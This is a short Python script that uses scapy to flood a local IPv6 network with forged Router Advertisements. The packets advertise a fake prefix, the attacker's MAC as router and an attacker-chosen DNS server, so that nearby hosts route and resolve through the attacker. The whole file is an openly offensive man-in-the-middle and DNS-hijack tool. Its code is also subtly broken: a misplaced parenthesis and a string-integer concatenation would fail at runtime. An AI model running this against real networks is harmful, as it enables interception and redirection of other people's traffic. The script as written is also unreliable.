#!/usr/bin/python
import sys
from scapy.layers.inet6 import IPv6, ICMPv6ND_RA, ICMPv6NDOptPrefixInfo, ICMPv6NDOptSrcLLAddr, ICMPv6NDOptRDNSS
from scapy.sendrecv import send

# Ask user to insert value
if len(sys.argv) == 6:
    attack_ip = sys.argv[1]
    attack_mac = sys.argv[2]
    prefix = sys.argv[3]
    prefix_length = int(sys.argv[4])
    dns_ip = sys.argv[5]
else:
    print("Please insert:\n 1. Attacker's IPv6\n 2. Attacker's MAC\n"
          " 3. IPv6 prefix\n 4. Prefix length\n 5. DNS server IPv6")
    sys.exit(1)

# Generate packet
layer3 = IPv6(src=attack_ip, dst="ff02::1")
packet1 = layer3/ICMPv6ND_RA(prf="High", routerlifetime=350)/\
         ICMPv6NDOptPrefixInfo(prefixlen=prefix_length,
                               validlifetime=0x12c,
                               preferredlifetime=0x96,
                               prefix=prefix)/\
         ICMPv6NDOptSrcLLAddr(lladdr=attack_mac/
                                     ICMPv6NDOptRDNSS(dns=[dns_ip]))
send(packet1, count=10000, inter=60, verbose=False)
print("Sending RA message with fake IPv6 prefix: " + prefix + "/" + prefix_length + " and DNS server: " + dns_ip)



